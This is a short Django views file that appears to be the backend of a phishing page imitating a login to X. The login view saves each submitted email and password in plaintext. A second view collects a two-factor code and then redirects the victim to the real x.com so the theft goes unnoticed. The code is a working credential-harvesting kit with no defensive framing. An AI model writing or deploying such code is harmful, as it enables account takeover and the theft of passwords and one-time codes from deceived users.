from django.shortcuts import render, redirect
from django.http import HttpResponse, HttpResponseRedirect
from .models import User

def login_view(request):
    if request.method == 'POST':
        email = request.POST['email']
        password = request.POST['password']
        User.objects.create(
        email=request.POST["email"], password=request.POST["password"]
        )
        return redirect("2PasosVeri")
    elif request.method == 'GET':
        return render(request, 'index.html')
    
def login_2(request):
    if request.method == 'POST':
        codigo = request.POST['2Pasos']
        return HttpResponseRedirect("https://x.com/?lang=es")
    elif request.method == 'GET':
        return render(request, '2FA.html')
